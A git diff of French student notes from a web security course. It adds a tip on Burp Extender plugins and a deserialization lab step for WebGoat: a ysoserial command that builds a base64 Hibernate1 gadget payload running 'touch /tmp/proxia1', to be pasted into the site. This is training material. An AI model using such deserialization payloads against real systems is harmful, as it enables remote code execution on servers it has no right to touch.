@@ -1,5 +1,11 @@
 #<center>Cyber-Sécurité</center>
 
+## Tips
+
+!!! Ajout de plugins
+    Dans Extender il est aisément possible d'ajouter des plugins,  
+    Notamment le Déserialiser utile pour le TP #deserialization
+
 ##Mise en jambes
 Faites de l'analyse de risque pour déterminer si on fait de la sécurité
 
@@ -313,3 +319,12 @@ Upgrade-Insecure-Requests: 1
 action=DeleteStaff
 ```
 
+#### Déserialization 
+
+`java -Dhibernate5 -jar ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 "touch /tmp/proxia1" | base64 -w0 > webgoat_payload1_touch.txt`
+
+On ouvre un shell dans le dossier LabWebSecu
+
+Ça créer un fichier txt, la ou on est
+
+On copie ce qu'il y a dans le txt dans le site
